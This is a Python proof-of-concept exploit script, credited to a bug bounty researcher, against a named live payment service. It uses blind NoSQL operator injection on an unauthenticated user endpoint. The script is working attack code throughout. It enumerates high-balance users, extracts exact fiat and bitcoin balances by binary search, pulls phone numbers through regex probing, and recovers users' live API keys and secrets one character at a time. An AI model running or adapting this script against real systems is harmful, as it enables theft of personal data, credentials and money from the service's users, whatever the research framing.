#!/usr/bin/env python3
"""
PoC: Blind NoSQLi Balance & PII Extraction
Target: app.pouch.ph
Endpoint: GET /api/v0/user (NO AUTHENTICATION REQUIRED)

Vulnerability: MongoDB operator injection via Express qs parser.
Extends the hash extraction PoC to demonstrate:

1. Balance extraction via binary search ($gt/$lt operators on balances.PHP, balances.BTC)
2. Phone number extraction via $regex on phone field
3. API key/secret extraction via $regex on liveKey/liveSecret fields
4. High-balance user targeting (find users with balances above thresholds)

All operations are READ-ONLY and require NO AUTHENTICATION.

Usage:
  python3 poc_nosqli_balance_pii.py --find-high-balance 1000
  python3 poc_nosqli_balance_pii.py --extract-balance admin
  python3 poc_nosqli_balance_pii.py --extract-phone admin
  python3 poc_nosqli_balance_pii.py --find-api-users
  python3 poc_nosqli_balance_pii.py --extract-apikey USERNAME

Author: Kakashi (Dave Lester Mondina) - Authorized Bug Bounty Research
"""
import requests
import argparse
import time
import sys

BASE_URL = "https://app.pouch.ph/api/v0/user"
PHONE_CHARSET = "+0123456789"
APIKEY_CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_-"
REGEX_SPECIAL = set("$.*+?^{}[]|()\\/")
DELAY = 0.4


def regex_escape(s):
    return "".join("\\" + c if c in REGEX_SPECIAL else c for c in s)


def check_match(params):
    try:
        r = requests.get(BASE_URL, params=params, timeout=20)
        data = r.json()
        return data.get("user") is not None, data.get("user")
    except requests.exceptions.Timeout:
        time.sleep(2)
        return None, None
    except Exception as e:
        print(f"  [!] Error: {e}")
        time.sleep(2)
        return None, None


def find_high_balance_users(threshold, currency="PHP"):
    print(f"[*] Finding users with {currency} balance > {threshold:,.0f}")
    print(f"[*] No authentication required.\n")
    users = []
    last = ""
    while True:
        params = {
            "username[$gt]": last,
            f"balances.{currency}[$gt]": str(threshold),
        }
        matched, user = check_match(params)
        if not matched or user is None:
            break
        users.append(user["username"])
        last = user["username"]
        print(f"  [+] {user['username']}")
        time.sleep(DELAY)
    print(f"\n[*] Total users with {currency} > {threshold:,.0f}: {len(users)}")
    return users


def extract_balance(username, currency="PHP"):
    print(f"[*] Extracting {currency} balance for user: {username}")
    print(f"[*] Using binary search via $gt/$lt operators (NO AUTH)\n")

    matched, _ = check_match({"username": username, f"balances.{currency}[$exists]": "true"})
    if not matched:
        print(f"  [-] Balance field does not exist for user '{username}'")
        return None

    low = 0.0
    high = 10000000.0

    matched, _ = check_match({"username": username, f"balances.{currency}[$gt]": "0"})
    if not matched:
        print(f"  [*] {currency} balance is 0 or negative")
        return 0

    matched, _ = check_match({"username": username, f"balances.{currency}[$gt]": str(high)})
    while matched:
        high *= 10
        matched, _ = check_match({"username": username, f"balances.{currency}[$gt]": str(high)})
        time.sleep(DELAY)

    for iteration in range(50):
        mid = (low + high) / 2
        matched, _ = check_match({"username": username, f"balances.{currency}[$gt]": str(mid)})
        time.sleep(DELAY)

        if matched:
            low = mid
        else:
            high = mid

        precision = high - low
        sys.stdout.write(f"\r  [+] Iteration {iteration+1:2d}: {currency} ~{low:,.2f} - {high:,.2f} (precision: {precision:,.2f})")
        sys.stdout.flush()

        if precision < 0.01:
            break

    result = (low + high) / 2
    print(f"\n\n[*] Extracted {currency} balance: ~{result:,.2f}")
    return result


def extract_phone(username):
    print(f"[*] Extracting phone number for user: {username}")
    print(f"[*] No authentication required.\n")

    matched, _ = check_match({"username": username, "phone[$exists]": "true"})
    if not matched:
        print(f"  [-] Phone field does not exist for user '{username}'")
        return ""

    known = ""
    for pos in range(15):
        found = False
        for c in PHONE_CHARSET:
            prefix = regex_escape(known)
            escaped_c = "\\" + c if c in REGEX_SPECIAL else c
            regex = "^" + prefix + escaped_c

            matched, _ = check_match({"username": username, "phone[$regex]": regex})
            if matched:
                known += c
                sys.stdout.write(f"\r  [+] [{pos+1:2d}] {known}")
                sys.stdout.flush()
                found = True
                time.sleep(DELAY)
                break

        if not found:
            print(f"\n\n[*] Extraction complete at position {pos+1}")
            break

    print(f"\n[*] Phone: {known}")
    return known


def find_api_users():
    print("[*] Finding users with API access enabled (apiAccess=true)")
    print("[*] No authentication required.\n")
    users = []
    last = ""
    while True:
        params = {
            "username[$gt]": last,
            "apiAccess": "true",
            "liveKey[$regex]": ".",
        }
        matched, user = check_match(params)
        if not matched or user is None:
            break
        users.append(user["username"])
        last = user["username"]
        print(f"  [+] {user['username']}")
        time.sleep(DELAY)
    print(f"\n[*] Total API users with live keys: {len(users)}")
    return users


def extract_apikey(username, field="liveKey"):
    print(f"[*] Extracting {field} for user: {username}")
    print(f"[*] No authentication required.\n")

    matched, _ = check_match({"username": username, f"{field}[$regex]": "."})
    if not matched:
        print(f"  [-] {field} not set for user '{username}'")
        return ""

    known = ""
    for pos in range(64):
        found = False
        for c in APIKEY_CHARSET:
            prefix = regex_escape(known)
            escaped_c = "\\" + c if c in REGEX_SPECIAL else c
            regex = "^" + prefix + escaped_c

            matched, _ = check_match({"username": username, f"{field}[$regex]": regex})
            if matched:
                known += c
                sys.stdout.write(f"\r  [+] [{pos+1:2d}] {known}")
                sys.stdout.flush()
                found = True
                time.sleep(DELAY)
                break

        if not found:
            print(f"\n\n[*] Extraction complete at position {pos+1}")
            break

    print(f"\n[*] {field}: {known}")
    return known


def main():
    parser = argparse.ArgumentParser(
        description="PoC: Blind NoSQLi Balance & PII Extraction on app.pouch.ph"
    )
    parser.add_argument(
        "--find-high-balance",
        metavar="THRESHOLD",
        type=float,
        help="Find users with PHP balance above threshold",
    )
    parser.add_argument(
        "--extract-balance",
        metavar="USERNAME",
        help="Extract exact PHP balance for username via binary search",
    )
    parser.add_argument(
        "--extract-balance-btc",
        metavar="USERNAME",
        help="Extract exact BTC balance for username",
    )
    parser.add_argument(
        "--extract-phone",
        metavar="USERNAME",
        help="Extract phone number for username",
    )
    parser.add_argument(
        "--find-api-users",
        action="store_true",
        help="Find users with API keys",
    )
    parser.add_argument(
        "--extract-apikey",
        metavar="USERNAME",
        help="Extract liveKey for username",
    )
    parser.add_argument(
        "--extract-apisecret",
        metavar="USERNAME",
        help="Extract liveSecret for username",
    )
    args = parser.parse_args()

    if not any([
        args.find_high_balance,
        args.extract_balance,
        args.extract_balance_btc,
        args.extract_phone,
        args.find_api_users,
        args.extract_apikey,
        args.extract_apisecret,
    ]):
        parser.print_help()
        return

    print("=" * 70)
    print("PoC: Blind NoSQLi Balance & PII Extraction - NO AUTH REQUIRED")
    print("Target: app.pouch.ph")
    print("=" * 70)
    print()

    if args.find_high_balance:
        find_high_balance_users(args.find_high_balance)
        print()

    if args.extract_balance:
        extract_balance(args.extract_balance, "PHP")
        print()

    if args.extract_balance_btc:
        extract_balance(args.extract_balance_btc, "BTC")
        print()

    if args.extract_phone:
        extract_phone(args.extract_phone)
        print()

    if args.find_api_users:
        find_api_users()
        print()

    if args.extract_apikey:
        extract_apikey(args.extract_apikey, "liveKey")
        print()

    if args.extract_apisecret:
        extract_apikey(args.extract_apisecret, "liveSecret")
        print()


if __name__ == "__main__":
    main()
